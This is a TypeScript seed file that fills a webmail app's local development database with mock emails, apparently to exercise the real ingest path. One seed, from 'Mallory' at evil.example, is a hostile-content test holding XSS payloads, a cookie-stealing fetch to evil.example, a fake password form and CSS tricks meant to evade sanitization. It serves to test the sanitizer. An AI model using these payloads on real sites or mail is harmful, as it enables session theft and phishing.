// Mock data for local development. Mail is built as real MIME and inserted the way the python
// lambda inserts it (raw bytes + an SES-shaped event), so the real ingest path is exercised.
import type pg from 'pg';
import MailComposer from 'nodemailer/lib/mail-composer/index.js';
import { hashPassword } from '../src/server/auth.js';

/** Local development sign-in. Only ever written to the throwaway embedded database. */
export const DEV_USER = { username: 'sam', password: 'eisenmail-local-dev' };

export { DEV_DOMAINS } from './dev-env.js';

interface Seed {
  kind?: 'inbound' | 'junk' | 'relay_out' | 'sent';
  hoursAgo: number;
  from: string;
  to: string[];
  cc?: string[];
  /** envelope recipients on our domains (defaults to "to") */
  rcpt?: string[];
  subject: string;
  text?: string;
  html?: string;
  attachments?: { filename: string; content: string | Buffer; contentType?: string }[];
  messageId?: string;
  inReplyTo?: string;
  repliesToSeed?: number;
  then?: { read?: boolean; flagged?: boolean; mailbox?: 'archive' | 'trash' };
}

const pdf = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Count 0/Kids[]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n');
const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

const card = (title: string, body: string, accent = '#2563eb') => `<!doctype html><html><body style="margin:0;background:#f4f5f7;font-family:Helvetica,Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding:24px">
<table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:8px;overflow:hidden">
<tr><td style="background:${accent};color:#fff;padding:18px 24px;font-size:18px;font-weight:bold">${title}</td></tr>
<tr><td style="padding:24px;color:#1f2937;font-size:14px;line-height:1.6">${body}</td></tr>
<tr><td style="padding:16px 24px;color:#6b7280;font-size:12px;border-top:1px solid #e5e7eb">You are receiving this because you have an account. <a href="https://example.com/unsubscribe">Unsubscribe</a></td></tr>
</table></td></tr></table></body></html>`;

const SEEDS: Seed[] = [
  {
    hoursAgo: 0.4,
    from: '"Jane Park" <jane.park@northwind.example>',
    to: ['cool_stuff@eisenberg.dev'],
    subject: 'Standing desk: still available?',
    messageId: '<desk-1@northwind.example>',
    text: 'Hi,\n\nI saw your listing for the standing desk. Is it still available, and would you take $180?\n\nI could pick it up Saturday morning.\n\nThanks,\nJane',
  },
  {
    hoursAgo: 1.5,
    from: '"GitHub" <notifications@github.example>',
    to: ['github@eisenberg.dev'],
    subject: '[seisenberg/geomblast] Lockstep desync on reconnect (#42)',
    html: card('seisenberg/geomblast', '<p><b>octo-contributor</b> opened issue <a href="https://github.example/seisenberg/geomblast/issues/42">#42</a></p><p>After a peer reconnects the simulation hash diverges within ~200 ticks. Repro steps and a replay file attached to the issue.</p><p><a href="https://github.example/seisenberg/geomblast/issues/42" style="background:#1f883d;color:#fff;padding:8px 14px;border-radius:6px;text-decoration:none">View issue</a></p>', '#24292f'),
    text: 'octo-contributor opened issue #42\n\nAfter a peer reconnects the simulation hash diverges within ~200 ticks.',
  },
  {
    hoursAgo: 3,
    from: '"Priya Raman" <priya@talentbridge.example>',
    to: ['sam@eisenberg.dev'],
    subject: 'Fractional CTO engagement: intro call next week?',
    text: 'Hi Sam,\n\nA portfolio company of ours (Series A, ~40 people, logistics) is looking for a fractional CTO for six months to rebuild their data platform and stand up an engineering hiring process.\n\nYour background at Book of the Month looked like a close fit. I have attached a one page brief. Would you have 30 minutes next week?\n\nBest,\nPriya Raman\nTalentBridge',
    attachments: [{ filename: 'Engagement brief.pdf', content: pdf, contentType: 'application/pdf' }],
    then: { flagged: true },
  },
  {
    hoursAgo: 5,
    from: '"Northwind Outfitters" <orders@shop.northwind.example>',
    to: ['shopping@eisenberg.dev'],
    subject: 'Your order #48213 has shipped',
    html: card('Your order is on its way', '<p>Hi Sam,</p><p>Order <b>#48213</b> shipped today and should arrive Thursday.</p><img src="https://images.northwind.example/banner/shipped.png" width="512" height="120" alt="Shipment banner"><table style="width:100%;margin-top:12px"><tr><td>Trail running shoes, size 11</td><td align="right">$129.00</td></tr><tr><td>Wool socks (3 pack)</td><td align="right">$24.00</td></tr></table><img src="https://track.northwind.example/open.gif?u=8842&m=48213" width="1" height="1" alt="">', '#b45309'),
    text: 'Order #48213 shipped today and should arrive Thursday.',
  },
  {
    hoursAgo: 7,
    from: '"Stripe" <notifications@payments.example>',
    to: ['billing@harborlight.example'],
    subject: 'Payout of $4,820.00 is on the way',
    html: card('Payout scheduled', '<p>A payout of <b>$4,820.00</b> to the account ending 6411 is expected to arrive in 2 business days.</p>', '#635bff'),
    text: 'A payout of $4,820.00 is expected to arrive in 2 business days.',
  },
  {
    hoursAgo: 9,
    from: '"Mallory" <mallory@evil.example>',
    to: ['test@eisenberg.dev'],
    subject: '<img src=x onerror=alert(1)> Totally safe message',
    html: '<html><head><script>document.title="pwned";fetch("https://evil.example/steal?c="+document.cookie)</script><style>@import url(https://evil.example/t.css); body{background:url(https://evil.example/bg.png)}</style><style><@import a;/style><@import a;form action="https://evil.example/phish2"><@import a;input placeholder="Password via style bypass"><@import a;/form></style></head><body onload="alert(1)"><h2>Hostile content test</h2><p>This message tries scripts, event handlers, forms, frames and trackers. None of them should run.</p><img src="x" onerror="alert(document.domain)"><a href="javascript:alert(1)">javascript link</a> <a href="https://example.com/ok" onclick="alert(2)">normal link</a><form action="https://evil.example/phish" method="post"><input name="password" placeholder="Re-enter your password"><button>Sign in</button></form><iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o.swf"></object><svg><script>alert(3)</script></svg><img src="https://evil.example/pixel.gif" width="1" height="1"><meta http-equiv="refresh" content="0;url=https://evil.example"></body></html>',
    text: 'Hostile content test.',
  },
  {
    hoursAgo: 12,
    from: '"Dana Whitfield" <dana@whitfield-law.example>',
    to: ['legal@harborlight.example'],
    cc: ['sam@eisenberg.dev'],
    rcpt: ['legal@harborlight.example', 'sam@eisenberg.dev'],
    subject: 'Harborlight LLC: annual report due November 1',
    text: 'Sam,\n\nA reminder that the annual report and franchise tax for Harborlight LLC are due November 1. I have attached the draft filing. Please confirm the registered agent address is unchanged and I will submit it.\n\nDana',
    attachments: [{ filename: 'Harborlight annual report (draft).pdf', content: pdf, contentType: 'application/pdf' }],
    then: { flagged: true },
  },
  {
    hoursAgo: 20,
    from: '"AWS Billing" <no-reply@aws.example>',
    to: ['aws@quartzworks.example'],
    subject: 'Your AWS invoice is available',
    html: card('Invoice available', '<p>Your invoice for September is available. Total: <b>$38.14</b>.</p><p>Lambda $0.92 · S3 $1.07 · SES $0.31 · EC2 $35.84</p>', '#232f3e'),
    text: 'Your invoice for September is available. Total: $38.14.',
    then: { read: true },
  },
  {
    hoursAgo: 26,
    from: '"Marcus Lee" <marcus.lee@bluepeak.example>',
    to: ['hello@quartzworks.example'],
    subject: 'Data warehouse migration: scope question',
    messageId: '<scope-7@bluepeak.example>',
    text: 'Hi Sam,\n\nThanks for the proposal. Two questions before we sign:\n\n1. Does the estimate include moving the Redshift workloads, or only the reporting layer?\n2. Can the cutover happen outside of month end close?\n\nMarcus',
    then: { read: true },
  },
  {
    hoursAgo: 30,
    from: '"Postgres Weekly" <weekly@pgweekly.example>',
    to: ['newsletters@eisenberg.dev'],
    subject: 'Postgres Weekly: skip scans, async I/O, and a planner deep dive',
    html: card('Postgres Weekly', '<p><b>Skip scan in practice</b>: when a multi-column btree beats two single-column indexes.</p><p><b>Async I/O benchmarks</b>: what io_method=worker buys you on cloud disks.</p><p><b>Reading EXPLAIN like a planner</b>: a guided tour.</p>', '#336791'),
    text: 'Skip scans, async I/O, and a planner deep dive.',
    then: { read: true },
  },
  {
    hoursAgo: 34,
    from: '"Tom Okafor" <tom.okafor@fastmail.example>',
    to: ['cool_stuff@eisenberg.dev'],
    subject: 'Re: Road bike listing',
    text: 'Is the bike a 56 or a 58? And is the price firm?\n\nTom',
    then: { read: true },
  },
  {
    hoursAgo: 49,
    from: '"United Airlines" <receipts@united.example>',
    to: ['travel@eisenberg.dev'],
    subject: 'eTicket itinerary and receipt: IAD to SFO, Oct 14',
    html: card('Your trip is confirmed', '<p>Confirmation <b>K4T9QX</b></p><p>Wed, Oct 14 · IAD 8:05 AM → SFO 10:52 AM · UA 1437</p><p>Fri, Oct 16 · SFO 4:20 PM → IAD 12:31 AM · UA 2210</p>', '#0033a0'),
    text: 'Confirmation K4T9QX. IAD to SFO Oct 14, return Oct 16.',
    attachments: [{ filename: 'itinerary.ics', content: 'BEGIN:VCALENDAR\nVERSION:2.0\nEND:VCALENDAR\n', contentType: 'text/calendar' }],
    then: { read: true },
  },
  {
    hoursAgo: 55,
    from: '"Chase" <no-reply@alerts.chase.example>',
    to: ['bank@eisenberg.dev'],
    subject: 'Your statement is ready',
    text: 'Your September statement is now available in online banking.',
    then: { read: true },
  },
  {
    hoursAgo: 60,
    from: '"Elena Rossi" <elena@rossi-design.example>',
    to: ['info@harborlight.example'],
    subject: 'Logo concepts, round 2',
    text: 'Hi Sam, round two attached. Number 3 is my favourite. Let me know which direction you want to refine.\n\nElena',
    attachments: [
      { filename: 'concept-1.png', content: png, contentType: 'image/png' },
      { filename: 'concept-2.png', content: png, contentType: 'image/png' },
      { filename: 'concept-3.png', content: png, contentType: 'image/png' },
    ],
    then: { read: true },
  },
  {
    hoursAgo: 75,
    from: '"Ravi Shah" <ravi@helpdesk-customer.example>',
    to: ['support@quartzworks.example'],
    subject: 'Dashboard export times out for large date ranges',
    text: 'Hello,\n\nExporting more than 90 days from the revenue dashboard times out after about a minute. Smaller ranges work.\n\nRavi',
  },
  {
    hoursAgo: 100,
    from: '"GitHub" <notifications@github.example>',
    to: ['github@eisenberg.dev'],
    subject: '[seisenberg/heirloom] Dependabot: 2 security updates',
    text: 'Dependabot opened 2 pull requests to fix vulnerable dependencies.',
    then: { read: true },
  },
  {
    hoursAgo: 130,
    from: '"Mom" <linda.e@family.example>',
    to: ['sam@eisenberg.dev'],
    subject: 'Thanksgiving plans',
    text: 'Are you two coming Wednesday or Thursday? Dad wants to know how big a turkey to order.\n\nLove, Mom',
    then: { read: true, mailbox: 'archive' },
  },
  {
    hoursAgo: 170,
    from: '"Old Vendor" <sales@legacy-vendor.example>',
    to: ['billing@harborlight.example'],
    subject: 'Final notice: renew your support contract',
    text: 'Your support contract expired. Renew today.',
    then: { read: true, mailbox: 'trash' },
  },
  {
    kind: 'junk',
    hoursAgo: 15,
    from: '"Prize Department" <winner@lucky-draw.example>',
    to: ['info@harborlight.example'],
    subject: 'You have WON! Claim your reward now',
    html: '<p>Congratulations! Click <a href="https://lucky-draw.example/claim">here</a> to claim.</p>',
    text: 'Congratulations! Claim now.',
  },
  // ---- outbound --------------------------------------------------------------------------------
  {
    kind: 'relay_out',
    hoursAgo: 33,
    from: 'cool_stuff@eisenberg.dev',
    to: ['tom.okafor@fastmail.example'],
    subject: 'Re: Road bike listing',
    text: "It's a 56. Price is firm, but I'll include the pedals.\n\n> Is the bike a 56 or a 58? And is the price firm?",
    repliesToSeed: 10,
  },
  {
    kind: 'sent',
    hoursAgo: 25,
    from: '"Sam Eisenberg" <hello@quartzworks.example>',
    to: ['marcus.lee@bluepeak.example'],
    subject: 'Re: Data warehouse migration: scope question',
    inReplyTo: '<scope-7@bluepeak.example>',
    text: 'Marcus,\n\n1. Yes, the Redshift workloads are in scope, including the nightly ELT.\n2. Cutover is planned for the second week of the month, well clear of close.\n\nSam',
    repliesToSeed: 8,
  },
];

async function build(seed: Seed, date: Date): Promise<Buffer> {
  return new MailComposer({
    from: seed.from,
    to: seed.to,
    cc: seed.cc,
    subject: seed.subject,
    text: seed.text,
    html: seed.html,
    date,
    messageId: seed.messageId,
    inReplyTo: seed.inReplyTo,
    references: seed.inReplyTo,
    attachments: seed.attachments,
  }).compile().build();
}

export async function seed(pool: pg.Pool): Promise<boolean> {
  await pool.query(
    `insert into webmail_users (email, passhash) values ($1, $2) on conflict (email) do nothing`,
    [DEV_USER.username, await hashPassword(DEV_USER.password)],
  );
  const existing = await pool.query('select 1 from lambda_inbox limit 1');
  if (existing.rowCount) return false;

  const now = Date.now();
  const ids: string[] = [];
  for (const [i, s] of SEEDS.entries()) {
    const date = new Date(now - s.hoursAgo * 3600_000);
    const raw = await build(s, date);
    const kind = s.kind ?? 'inbound';
    const id = `seed-${String(i).padStart(3, '0')}`;
    ids.push(id);
    const outbound = kind === 'relay_out' || kind === 'sent';
    const event = outbound
      ? null
      : {
          mail: { timestamp: date.toISOString(), messageId: id, source: s.from },
          receipt: {
            recipients: s.rcpt ?? s.to,
            spfVerdict: { status: kind === 'junk' ? 'FAIL' : 'PASS' },
            dkimVerdict: { status: kind === 'junk' ? 'FAIL' : 'PASS' },
            dmarcVerdict: { status: kind === 'junk' ? 'FAIL' : 'PASS' },
            spamVerdict: { status: kind === 'junk' ? 'FAIL' : 'PASS' },
            virusVerdict: { status: 'PASS' },
          },
        };
    const fromAddr = /<([^>]+)>/.exec(s.from)?.[1] ?? s.from;
    const meta = outbound ? { from: fromAddr, to: s.to, cc: [], bcc: [], in_reply_to_raw_id: s.repliesToSeed !== undefined ? ids[s.repliesToSeed] : null } : null;
    await pool.query(
      `insert into lambda_inbox (message_id, created_at, s3_key, event, email_raw, kind, meta) values ($1, $2, $3, $4, $5, $6, $7)`,
      [id, date, outbound ? null : `email-inbox/${id}`, event && JSON.stringify(event), raw, kind, meta && JSON.stringify(meta)],
    );
  }
  return true;
}

/** Read / flag / archive state for the seeded messages. Run once, after the first ingest. */
export async function seedState(pool: pg.Pool): Promise<void> {
  for (const [i, s] of SEEDS.entries()) {
    if (!s.then) continue;
    const id = `seed-${String(i).padStart(3, '0')}`;
    await pool.query(
      `update messages set is_read = coalesce($2, is_read), is_flagged = coalesce($3, is_flagged),
              prev_mailbox = case when $4 = 'trash' then mailbox else prev_mailbox end,
              mailbox = coalesce($4, mailbox)
        where raw_id = $1`,
      [id, s.then.read ?? null, s.then.flagged ?? null, s.then.mailbox ?? null],
    );
  }
}
